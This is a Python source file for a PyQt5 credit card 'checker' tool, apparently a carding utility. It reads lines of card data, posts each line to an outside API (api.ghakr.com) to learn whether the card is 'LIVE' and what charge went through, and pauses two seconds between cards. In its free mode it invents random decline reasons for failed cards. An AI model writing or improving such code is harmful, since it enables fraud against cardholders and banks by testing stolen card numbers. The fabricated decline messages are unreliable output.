# gui/worker.py
import random
import requests
from PyQt5.QtCore import QThread, pyqtSignal
from core.checker import parse_cc_line, validate_cc_local, get_card_brand

class CheckerWorker(QThread):
    progress = pyqtSignal(int)
    result = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, lines, premium=False, session=None):
        super().__init__()
        self.lines = lines
        self.premium = premium
        self.session = session
        self._is_running = True

    def stop(self):
        self._is_running = False

    def run(self):
        total = len(self.lines)
        for idx, line in enumerate(self.lines):
            if not self._is_running:
                break

            line = line.strip()
            if not line:
                self.result.emit("❓ SKIP: Empty line")
                self.progress.emit(idx + 1)
                # Still wait 2 seconds even for empty lines (optional)
                if not self._wait_with_check(2000):
                    break
                continue

            if self.premium and self.session:
                # ---------- Premium Check (API) ----------
                try:
                    resp = self.session.post(
                        'https://api.ghakr.com/api_python.php',
                        data={'cclist': line},
                        timeout=15
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        status = data.get('status', 'unknown')
                        msg = data.get('msg', '')
                        charge = data.get('charge', '')
                        brand = data.get('brand', 'UNKNOWN')
                        if status == 'live':
                            self.result.emit(f"✅ LIVE: {line} -> {msg} [${charge}] [{brand}]")
                        elif status == 'die':
                            self.result.emit(f"❌ DIE: {line} -> {msg} [{brand}]")
                        else:
                            self.result.emit(f"❓ UNKNOWN: {line} -> {msg} [{brand}]")
                    else:
                        self.result.emit(f"⚠️ ERROR: {line} -> HTTP {resp.status_code}")
                except Exception as e:
                    self.result.emit(f"⚠️ ERROR: {line} -> {str(e)}")
            else:
                # ---------- Free Check (Local) ----------
                card = parse_cc_line(line)
                if not card:
                    self.result.emit(f"❓ SKIP: Invalid format -> {line}")
                else:
                    brand = get_card_brand(card['number'])
                    result = validate_cc_local(card)
                    if result == 'live':
                        self.result.emit(f"✅ LIVE: {line} -> Approved [{brand}]")
                    elif result == 'die':
                        die_msgs = ["Declined", "Expired", "Insufficient Funds", "Security Code Mismatch"]
                        self.result.emit(f"❌ DIE: {line} -> {random.choice(die_msgs)} [{brand}]")
                    else:
                        self.result.emit(f"❓ UNKNOWN: {line} -> Invalid Format [{brand}]")

            # Update progress (after processing the card)
            self.progress.emit(idx + 1)

            # ---------- 2 SECOND DELAY (with stop check) ----------
            if not self._wait_with_check(2000):
                break

        self.finished.emit()

    def _wait_with_check(self, delay_ms: int) -> bool:
        """
        Sleep for `delay_ms` milliseconds, but check the stop flag every 100ms.
        Returns False if stop was requested, True if the full delay elapsed.
        """
        steps = delay_ms // 100
        for _ in range(steps):
            if not self._is_running:
                return False
            self.msleep(100)
        # Final check after the loop (if delay wasn't multiple of 100)
        return self._is_running
